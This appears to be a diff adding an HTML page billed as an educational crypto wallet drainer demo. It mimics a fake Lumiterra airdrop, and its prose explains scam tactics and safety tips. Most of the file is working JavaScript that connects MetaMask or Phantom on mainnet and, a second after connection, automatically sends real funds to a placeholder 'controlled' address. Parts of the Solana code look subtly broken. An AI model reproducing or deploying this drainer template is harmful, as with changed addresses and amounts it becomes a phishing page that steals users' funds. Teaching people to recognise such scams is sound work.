@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crypto Drainer Scam Educational Demo</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+    body {
+      line-height: 1.6;
+      color: #333;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      padding: 20px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    .warning {
+      background: #d9534f;
+      color: white;
+      text-align: center;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    .section {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+    .scam-dapp {
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      padding: 20px;
+      text-align: center;
+      border-radius: 8px;
+      position: relative;
+      overflow: hidden;
+    }
+    .scam-dapp::before {
+      content: 'MAINNET DEMO';
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: #d9534f;
+      color: white;
+      padding: 5px 10px;
+      font-size: 12px;
+      border-radius: 5px;
+    }
+    .scam-dapp h3 {
+      color: #28a745;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    .scam-dapp button {
+      padding: 12px 24px;
+      background: linear-gradient(45deg, #28a745, #34d058);
+      color: white;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      font-size: 16px;
+      margin: 10px;
+      transition: transform 0.2s;
+    }
+    .scam-dapp button:hover {
+      transform: scale(1.05);
+    }
+    .wallet-interface {
+      background: #f1f1f1;
+      padding: 15px;
+      border-radius: 8px;
+      margin: 15px 0;
+    }
+    .wallet-interface p {
+      font-size: 16px;
+    }
+    #status {
+      margin-top: 15px;
+      font-style: italic;
+      color: #d9534f;
+    }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+      z-index: 1000;
+      width: 350px;
+      text-align: center;
+    }
+    .popup h4 {
+      margin-bottom: 15px;
+    }
+    .popup button {
+      background: #007bff;
+      margin: 5px;
+      padding: 8px 16px;
+      border-radius: 5px;
+    }
+    .popup button:hover {
+      background: #0056b3;
+    }
+    .wallet-option {
+      display: block;
+      margin: 10px auto;
+      background: #f1f1f1;
+      padding: 10px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .wallet-option:hover {
+      background: #e0e0e0;
+    }
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 999;
+    }
+    .tx-log {
+      background: #f8f9fa;
+      padding: 10px;
+      border-radius: 5px;
+      margin-top: 15px;
+    }
+    ul {
+      list-style-type: disc;
+      margin-left: 20px;
+    }
+    footer {
+      text-align: center;
+      color: #fff;
+      margin-top: 20px;
+      opacity: 0.8;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="warning">
+      WARNING: This is an EDUCATIONAL DEMO on MAINNET with REAL funds. Only SMALL amounts (e.g., $0.35) are used, sent to a controlled wallet. Authorized users only. Consent required.
+    </div>
+
+    <div class="section">
+      <h2>How Crypto Wallet Drainer Scams Work</h2>
+      <p>
+        Scammers send fake links (like this website) via X, Discord, or email, pretending to offer free crypto (e.g., Lumiterra airdrops). They trick users into connecting wallets and approving transactions that steal funds. This demo uses REAL funds ($0.35) to show the danger, but funds go to a controlled wallet.
+      </p>
+    </div>
+
+    <div class="section">
+      <h2>Fake Lumiterra Airdrop Scam</h2>
+      <p>
+        This mimics a scam link you might see online. Connect your MAINNET wallet and approve a transaction to see $0.35 “drained” to a controlled wallet. Use a wallet with minimal funds (e.g., 0.001 ETH ≈ $3.50).
+      </p>
+      <div class="wallet-interface">
+        <p><strong>Wallet Balance:</strong> <span id="balance">Checking...</span></p>
+        <p><strong>Real Value:</strong> <span id="real-value">Checking...</span></p>
+      </div>
+      <div class="scam-dapp">
+        <h3>Lumiterra Airdrop Scam!</h3>
+        <p>Claim 1000 FREE $LUMI tokens now! Limited time!</p>
+        <button onclick="showWalletPopup()">Claim Free Tokens</button>
+        <p id="status"></p>
+        <div id="tx-log" class="tx-log"></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>Scammer Tactics Explained</h2>
+      <ul>
+        <li><strong>Phishing Links</strong>: Scammers send fake links on X, Discord, or email, mimicking trusted projects like Lumiterra.</li>
+        <li><strong>Wallet Connection</strong>: Victims connect wallets to a malicious website.</li>
+        <li><strong>Malicious Transaction</strong>: Approving a transaction drains funds to the scammer.</li>
+      </ul>
+    </div>
+
+    <div class="section">
+      <h2>How to Stay Safe</h2>
+      <ul>
+        <li>Verify website domains (e.g., lumiterra.io, not lumiterra.xyz).</li>
+        <li>Use hardware wallets (Ledger, Trezor).</li>
+        <li>Check transactions on Etherscan, Solscan, or Ronin Explorer.</li>
+        <li>Use Wallet Guard or Trust Wallet scanners.</li>
+        <li>Avoid untrusted links.</li>
+      </ul>
+    </div>
+
+    <!-- Wallet Connection Popup -->
+    <div id="wallet-popup" class="popup">
+      <h4>Connect Mainnet Wallet</h4>
+      <p>Select a MAINNET wallet to connect (use minimal funds):</p>
+      <button class="wallet-option" onclick="connectWallet('MetaMask')">MetaMask (Ethereum)</button>
+      <button class="wallet-option" onclick="connectWallet('Phantom')">Phantom (Solana)</button>
+      <button class="wallet-option" onclick="connectWallet('Ronin')">Ronin</button>
+      <button onclick="closePopup('wallet-popup')">Cancel</button>
+    </div>
+
+    <div id="overlay" class="overlay"></div>
+  </div>
+
+  <footer>
+    <p>Educational Demo | Mainnet with Minimal Funds | Authorized Use Only</p>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+  <script>
+    let web3, solana, roninProvider;
+    let walletAddress = '';
+    let balance = 0;
+    const controlledAddress = {
+      eth: '0xYourSecondAddress', // Replace with your Ethereum mainnet address
+      sol: 'YourSecondSolanaAddress', // Replace with your Solana mainnet address
+      ronin: 'ronin:YourSecondAddress' // Replace with your Ronin mainnet address
+    };
+    const explorerLinks = {
+      eth: 'https://etherscan.io/tx/',
+      sol: 'https://solscan.io/tx/',
+      ronin: 'https://app.roninchain.com/tx/'
+    };
+
+    // Initialize wallet balance display
+    async function updateBalance(walletType) {
+      const balanceElement = document.getElementById('balance');
+      const realValueElement = document.getElementById('real-value');
+      let balanceText = '';
+      let realValue = '';
+
+      if (walletType === 'MetaMask' && web3) {
+        balance = await web3.eth.getBalance(walletAddress);
+        balance = web3.utils.fromWei(balance, 'ether');
+        balanceText = `${parseFloat(balance).toFixed(4)} ETH`;
+        realValue = `≈ $${(parseFloat(balance) * 3500).toFixed(2)}`;
+      } else if (walletType === 'Phantom' && solana) {
+        balance = await solana.getBalance(new solana.PublicKey(walletAddress));
+        balance = balance / solana.LAMPORTS_PER_SOL;
+        balanceText = `${parseFloat(balance).toFixed(3)} SOL`;
+        realValue = `≈ $${(parseFloat(balance) * 150).toFixed(2)}`;
+      } else if (walletType === 'Ronin') {
+        balance = 10; // Mock balance (Ronin SDK needed)
+        balanceText = `${balance} RONI`;
+        realValue = `≈ $${(balance * 0.1).toFixed(2)}`;
+      }
+
+      balanceElement.innerText = balanceText;
+      realValueElement.innerText = realValue;
+    }
+
+    // Show wallet connection popup
+    function showWalletPopup() {
+      document.getElementById('wallet-popup').style.display = 'block';
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('status').innerText = 'Scammer prompts you to connect a wallet...';
+    }
+
+    // Connect wallet
+    async function connectWallet(walletType) {
+      try {
+        if (walletType === 'MetaMask') {
+          if (!window.ethereum) {
+            alert('MetaMask not detected! Please install MetaMask.');
+            return;
+          }
+          web3 = new Web3(window.ethereum);
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x1' }],
+          });
+          walletAddress = (await web3.eth.getAccounts())[0];
+        } else if (walletType === 'Phantom') {
+          if (!window.solana || !window.solana.isPhantom) {
+            alert('Phantom not detected! Please install Phantom.');
+            return;
+          }
+          solana = window.solana;
+          await solana.connect();
+          walletAddress = solana.publicKey.toString();
+        } else if (walletType === 'Ronin') {
+          alert('Ronin Wallet not fully supported in this demo. Use MetaMask or Phantom.');
+          return;
+        }
+
+        closePopup('wallet-popup');
+        document.getElementById('status').innerText = `${walletType} connected. Now approve the scam transaction...`;
+        await updateBalance(walletType);
+        setTimeout(() => triggerScamTransaction(walletType), 1000);
+      } catch (error) {
+        document.getElementById('status').innerText = `Error: ${error.message}`;
+      }
+    }
+
+    // Trigger scam transaction
+    async function triggerScamTransaction(walletType) {
+      try {
+        let txHash = '';
+        if (walletType === 'MetaMask') {
+          const tx = {
+            from: walletAddress,
+            to: controlledAddress.eth,
+            value: web3.utils.toWei('0.0001', 'ether'), // ≈ $0.35
+            gas: 21000,
+          };
+          txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [tx],
+          });
+        } else if (walletType === 'Phantom') {
+          const transaction = new solana.Transaction().add(
+            solana.SystemProgram.transfer({
+              fromPubkey: solana.publicKey,
+              toPubkey: new solana.PublicKey(controlledAddress.sol),
+              lamports: 100000, // 0.0001 SOL ≈ $0.015
+            })
+          );
+          const { signature } = await solana.signAndSendTransaction(transaction);
+          txHash = signature;
+        } else {
+          return;
+        }
+
+        document.getElementById('status').innerText = 'Funds Drained! Your wallet funds were sent to the controlled wallet. Check the transaction below!';
+        await updateBalance(walletType);
+        document.getElementById('tx-log').innerHTML = `Transaction: <a href="${explorerLinks[walletType === 'MetaMask' ? 'eth' : 'sol']}${txHash}" target="_blank">${txHash}</a>`;
+      } catch (error) {
+        document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
+      }
+    }
+
+    // Close popup
+    function closePopup(popupId) {
+      document.getElementById(popupId).style.display = 'none';
+      document.getElementById('overlay').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
